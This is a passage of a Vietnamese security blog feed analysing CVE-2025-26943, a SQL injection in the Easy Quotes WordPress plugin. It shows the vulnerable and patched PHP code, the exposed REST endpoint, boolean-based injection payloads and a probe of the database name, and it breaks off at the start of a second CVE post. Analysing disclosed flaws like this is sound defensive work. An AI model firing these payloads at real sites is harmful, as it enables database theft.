1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Taskbuilder Plugin&lt;/strong&gt;:  v1.2.2(vul) và v1.2.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà &lt;strong&gt;không sử dụng các biện pháp bảo vệ&lt;/strong&gt; khiến lỗ hổng SQL Injection xảy ra.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;includes/quotes-data.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT * FROM %i WHERE `family` = %s&amp;#34;,&#xA;        $tablename, $family&#xA;    );&#xA;    return $wpdb-&amp;gt;get_row($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/patch_dif.png&#34;&#xA;    alt=&#34;Patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Có nhiều hàm cũng được vá bằng cách trên, như: &lt;code&gt;get_font_variant($family_id, $variant_id)&lt;/code&gt;, &lt;code&gt;get_font_variants($family)&lt;/code&gt;, &lt;code&gt;get_fonts($category = -1)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy &lt;code&gt;get_fonts_categories()&lt;/code&gt; đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_fonts_categories() {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-categories&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT `category_id`, `category` FROM %i&amp;#34;,&#xA;        $tablename&#xA;    );&#xA;    return $wpdb-&amp;gt;get_results($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta khai thác lỗi SQL Injection trong hàm &lt;code&gt;get_family_data($family)&lt;/code&gt;, các hàm còn lại khai thác tương tự.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; là hàm public trong class &lt;code&gt;Quotes_Data&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Data&#xA;{&#xA;&#x9;function __construct()&#xA;&#x9;{&#xA;&#x9;&#x9;add_filter(&amp;#39;posts_where&amp;#39;, array($this, &amp;#39;posts_where&amp;#39;), 10, 2);&#xA;&#x9;}&#xA;&#xA;    // other function&#xA;&#xA;&#x9;public static function get_font_variants($family) {&#xA;&#x9;&#x9;$familyData = self::get_family_data($family);&#xA;        // other logic&#xA;&#x9;}&#xA;&#xA;&#x9;public static function get_family($family, $variant_id) {&#xA;&#x9;&#x9;$family_data = (array)self::get_family_data($family);&#xA;        // other logic&#xA;&#x9;}&#xA;&#xA;&#x9;private static function get_family_data($family) {&#xA;&#x9;&#x9;/** @var wpdb $wpdb */&#xA;&#x9;&#x9;global $wpdb;&#xA;&#x9;&#x9;$tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;&#x9;&#x9;return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; được gọi trong 2 hàm &lt;code&gt;get_family()&lt;/code&gt; và &lt;code&gt;get_font_variants()&lt;/code&gt; của class &lt;code&gt;Quotes_Data&lt;/code&gt;, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa &lt;code&gt;get_family&lt;/code&gt; hoặc &lt;code&gt;get_font_variants&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/search_func.png&#34;&#xA;    alt=&#34;Search function&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search function&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Hàm &lt;code&gt;get_font_variants()&lt;/code&gt; được gọi trong hàm &lt;code&gt;rest_route_callback_font_variants()&lt;/code&gt; của class &lt;code&gt;Quotes_Rest_Route&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Rest_Route&#xA;{&#xA;    function __construct()&#xA;    {&#xA;        add_action(&amp;#39;rest_api_init&amp;#39;, array($this, &amp;#39;rest_api_init&amp;#39;));&#xA;    }&#xA;&#xA;    /**&#xA;     * Register my REST route&#xA;     *&#xA;     * @return void&#xA;     */&#xA;    function rest_api_init($wp_rest_server)&#xA;    {&#xA;        $args = [&#xA;        &amp;#39;method&amp;#39;                =&amp;gt; WP_REST_Server::READABLE,&#xA;        &amp;#39;callback&amp;#39;              =&amp;gt; [$this, &amp;#39;rest_route_callback_quote&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39;   =&amp;gt; &amp;#39;__return_true&amp;#39;&#xA;        ];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/quote&amp;#39;, $args);&#xA;&#xA;        // other logic&#xA;&#xA;        $args[&amp;#39;callback&amp;#39;] = [$this, &amp;#39;rest_route_callback_font_variants&amp;#39;];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/font-variants&amp;#39;, $args);&#xA;    }&#xA;&#xA;    // other function&#xA;&#xA;    function rest_route_callback_font_variants(WP_REST_Request $request)&#xA;    {&#xA;        $family = $request-&amp;gt;get_param(&amp;#39;family&amp;#39;);&#xA;        $family = isset($family) ? $family : &amp;#34;Shadows Into Light&amp;#34;;&#xA;&#xA;        $response = Quotes_Data::get_font_variants($family);&#xA;        return rest_ensure_response($response);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm khởi tạo của class &lt;code&gt;Quotes_Rest_Route&lt;/code&gt; sử dụng &lt;code&gt;add_action(hook_name, callback)&lt;/code&gt; với &lt;code&gt;hook_name&lt;/code&gt; là &lt;code&gt;rest_api_init&lt;/code&gt; để đăng ký các endpoint tùy chỉnh với REST API System của WordPress&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;rest_api_init&lt;/code&gt; sử dụng &lt;code&gt;register_rest_route&lt;/code&gt; nhiều lần để tạo các endpoint dưới namespace &lt;code&gt;layart/v1&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;rest_route_callback_font_variants&lt;/code&gt; là callback của endpoint &lt;code&gt;/wp-json/layart/v1/font-variants?family=family_name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$family&lt;/code&gt; mặc định là &lt;code&gt;Shadows Into Light&lt;/code&gt; nếu không được truyền trong param.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta thử kỹ thuật &lt;strong&gt;Boolean-based SQL Injection&lt;/strong&gt; để kiểm tra xem tham số family có dễ bị chèn lệnh SQL hay không.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;True request&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/true_req.png&#34;&#xA;    alt=&#34;True request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;True request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Khi đó, câu query thực thi sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;&amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều kiện &lt;code&gt;AND &#39;1&#39;=&#39;1&#39;&lt;/code&gt; luôn đúng =&amp;gt; query hợp lệ, trả về dữ liệu bình thường.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;False request&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/false_req.png&#34;&#xA;    alt=&#34;False request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;False request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Khi đó, câu query thực thi sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;&amp;#39;1&amp;#39;=&amp;#39;2&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều kiện &lt;code&gt;AND &#39;1&#39;=&#39;2&#39;&lt;/code&gt; luôn sai =&amp;gt; query không khớp =&amp;gt; trả về &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Database name được tôi đặt tên là &lt;strong&gt;wordpress&lt;/strong&gt; nên kí tự đầu tiên là &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/first_letter.png&#34;&#xA;    alt=&#34;First letter&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;First letter&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Response trả về dữ liệu bình thường =&amp;gt; kí tự đầu tiên là &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi đó, câu query thực thi sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39;&amp;#43;AND&amp;#43;SUBSTRING(DATABASE(),1,1)=&amp;#39;w&amp;#39;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-26943&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Easy Quotes&lt;/strong&gt; trước phiên bản &lt;strong&gt;1.2.3&lt;/strong&gt; xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn &lt;code&gt;($wpdb-&amp;gt;prepare)&lt;/code&gt; mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/easy-quotes/vulnerability/wordpress-easy-quotes-plugin-1-2-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin &amp;lt;= 1.2.2 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39569 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/</link>
      <pubDate>Mon, 22 Sep 2025 18:56:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Taskbuilder&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;4.0.2&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39569&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39569&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/taskbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; 